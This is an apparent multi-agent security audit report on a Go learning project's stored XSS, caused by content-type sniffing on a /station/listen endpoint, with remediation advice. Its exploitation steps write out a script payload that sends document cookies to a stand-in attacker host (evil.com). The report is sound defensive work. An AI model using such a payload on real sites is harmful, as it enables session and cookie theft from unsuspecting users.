---

# Final Security Report — Station Manager Subsystem

## 1. Confirmed Vulnerabilities

### Stored XSS via Content-Type Sniffing on `/station/listen`

| Field | Detail |
|-------|--------|
| **Severity** | Low (see note) |
| **Location** | `main.go:98` — `w.Write(data)` in `subscribe` handler |
| **Enabling code** | `broadcaster.go:93` (stores payload), `broadcaster.go:127-130` (replays to all subscribers) |
| **Identified by** | All three agents (convergent finding) |
| **Judge verdicts** | RAISE (2), DISMISS (1) — raised by majority |

**Description:** The `subscribe` handler writes attacker-controlled bytes to the HTTP response without setting a `Content-Type` header. On the first `w.Write()` call, Go invokes `http.DetectContentType()` using the WHATWG MIME sniffing algorithm. If the first broadcast message starts with an HTML signature (`<html>`, `<script>`, `<!DOCTYPE>`, etc.), Go sets `Content-Type: text/html; charset=utf-8`, causing browsers to render and execute the content.

The Broadcaster's append-only history buffer (`broadcaster.go:93`) makes this **stored** — the payload persists for the station's lifetime and is replayed to every new subscriber starting at `cursor=0`.

The `//nolint:gosec` comment on `main.go:98` suppresses the security linter under the assumption data is "raw audio stream, not HTML," but nothing in the `broadcast` handler (`main.go:119-138`) enforces this. `io.ReadAll(r.Body)` accepts arbitrary bytes with no validation.

**Exploitation:**
1. `POST /station?id=music` — create station
2. `POST /station/broadcast?id=music` with body `<html><script>fetch('https://evil.com/steal?c='+document.cookie)</script></html>` — payload stored in `b.history[0]`
3. Victim visits `GET /station/listen?id=music` — Go sniffs `<html>`, sets `Content-Type: text/html`, browser executes JavaScript
4. Every subsequent listener replays the same payload from history

**Severity note:** All three agents rated this High, but the judges correctly observed this is a learning project with no authentication, no sessions, no cookies, and no deployment. The XSS has no meaningful target to exploit in the current context. Adjusted to **Low/Informational** — worth fixing as a learning exercise, not an emergency.

**Remediation:** Add two lines before the write loop in the `subscribe` handler (`main.go`, before line 92):

```go
w.Header().Set("Content-Type", "application/octet-stream")
w.Header().Set("X-Content-Type-Options", "nosniff")
```

This prevents MIME sniffing entirely. The `//nolint:gosec` comment on line 98 can then be removed since the root cause is addressed.

---

## 2. Dismissed Findings

None beyond the third instance of the same XSS finding, which was dismissed by its judge on the grounds that the project has no sessions/cookies/user state to exploit and the developer's `//nolint:gosec` comment shows conscious awareness. This reasoning is valid for severity calibration but not sufficient to suppress the finding entirely, which is why the consolidated finding above is retained at Low severity.

---

## 3. Recommendations

1. **Set explicit `Content-Type: application/octet-stream` and `X-Content-Type-Options: nosniff`** on the subscribe handler. One-line fix, eliminates the entire class of content-sniffing attacks. This is good practice for any endpoint serving raw binary data.

2. **Remove the `//nolint:gosec` suppression** on `main.go:98` after applying the fix — the suppression masks a real issue and the fix makes it unnecessary.

3. **Consider adding `r.Body = http.MaxBytesReader(w, r.Body, maxSize)`** in the `broadcast` handler. Currently `io.ReadAll(r.Body)` reads unbounded input into memory. Not a security finding per se (DoS via resource exhaustion is out of scope), but worth noting as a hardening step if the project evolves.
